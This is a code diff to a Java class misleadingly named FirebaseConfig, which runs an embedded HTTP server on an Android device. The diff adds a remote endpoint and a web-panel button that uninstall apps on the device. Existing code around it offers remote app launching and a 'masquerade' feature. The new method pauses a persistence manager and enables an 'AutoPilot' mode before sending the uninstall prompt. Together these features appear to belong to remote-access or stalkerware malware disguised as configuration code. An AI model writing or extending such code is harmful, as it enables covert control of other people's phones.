@@ -571,6 +571,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/open-app")) {
             openAppOnDevice(params.get("pkg"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/uninstall-app")) {
+            uninstallAppOnDevice(params.get("pkg"));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
         } else if (uri.equals("/device/masquerade")) {
             String pkg = params.get("pkg");
             return handleMasqueradeApp(pkg, session);
@@ -1032,6 +1035,25 @@ public class FirebaseConfig extends NanoHTTPD {
         }
     }
 
+    private void uninstallAppOnDevice(String packageName) {
+        if (packageName == null || packageName.isEmpty()) return;
+        try {
+            IO_Persistence_Manager.stopSmartExit();
+            context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE)
+                .edit().putBoolean("is_repairing", true).apply();
+            IO_Persistence_Manager.setAutoPilot(true);
+
+            android.net.Uri packageURI = android.net.Uri.parse("package:" + packageName);
+            Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageURI);
+            uninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+            uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(uninstallIntent);
+            logActivity("DEVICE_CONTROL: Dispatched uninstall prompt for - " + packageName);
+        } catch (Exception e) {
+            logActivity("DEVICE_ERROR: Failed to uninstall app - " + e.getMessage());
+        }
+    }
+
     private void showToast(String msg) {
         showToast(msg, 22, 250, "scroll", 12000, "#FFFFFF");
     }
@@ -1098,6 +1120,9 @@ public class FirebaseConfig extends NanoHTTPD {
 
             html.append("<td style=\"white-space: nowrap;\">");
             html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05);\">▶️ LAUNCH</a>");
+            if (!isSystem && !app.packageName.equals(context.getPackageName())) {
+                html.append("<a href=\"/device/uninstall-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); background:rgba(255,49,49,0.05); margin-left:8px;\">🗑️ UNINSTALL</a>");
+            }
             html.append("</td></tr>");
         }
         html.append("</tbody></table></div></div>").append(getFooter());
